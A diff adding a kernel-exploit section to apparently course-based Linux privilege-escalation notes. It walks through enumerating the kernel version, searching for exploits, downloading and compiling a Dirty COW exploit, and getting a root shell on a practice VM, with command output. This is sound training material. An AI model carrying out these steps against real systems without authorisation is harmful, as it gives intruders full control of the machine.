@@ -725,6 +725,69 @@ experiment with them:
 • http://pentestmonkey.net/tools/audit/unix-privesc-check
 
 ## Kernel Exploits
+
+Kernels are the core of any operating system.
+Think of it as a layer between application software and the
+actual computer hardware.
+The kernel has complete control over the operating system.
+Exploiting a kernel vulnerability can result in execution as the
+root user.
+
+Finding and using kernel exploits is usually a simple process:
+1. Enumerate kernel version (uname -a).
+2. Find matching exploits (Google, ExploitDB, GitHub).
+3. Compile and run.
+Beware though, as Kernel exploits can often be unstable and
+may be one-shot or cause a system crash.
+
+### Privilege Escalation
+1. Enumerate the kernel version:
+```
+$ uname -a
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_6
+4 GNU/Linux
+```
+2.Use searchsploit to find matching exploits:
+```
+# searchsploit linux kernel 2.6.32 priv esc
+```
+Note that none of the exploits match the distribution of Linux (Debian).
+
+3.
+We can try and adjust our search to be less specific with the kernel version, but
+more specific with the distribution:
+```
+# searchsploit linux kernel 2.6 priv esc debian
+```
+Again, we get a few exploits that we can’t use for various reasons.
+4.
+Install Linux Exploit Suggester 2 (https://github.com/jondonas/linux-exploit-
+suggester-2) and run the tool against the original kernel version:
+```
+# ./linux-exploit-suggester-2.pl –k 2.6.32
+```
+This reveals a popular kernel exploit (Dirty COW).
+5.There are a number of Dirty COW exploits, all of which use
+different methods to obtain a root shell. The following
+version seems to work best on the practice VM:
+https://gist.github.com/KrE80r/42f8629577db95782d5e4f6
+09f437a54
+6.Download and compile it using the instructions in the file:
+```
+$ gcc -pthread c0w.c -o c0w
+```
+7. Run the exploit:
+```
+$ ./c0w
+```
+8. Once the exploit is complete, simply execute the
+/usr/bin/passwd binary to get a root shell:
+```
+$ /usr/bin/passwd
+root@debian:/home/user# id
+uid=0(root) gid=1000(user) groups=0(root) ...
+```
+## Service Exploits
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Linux Privilige Escalation 1
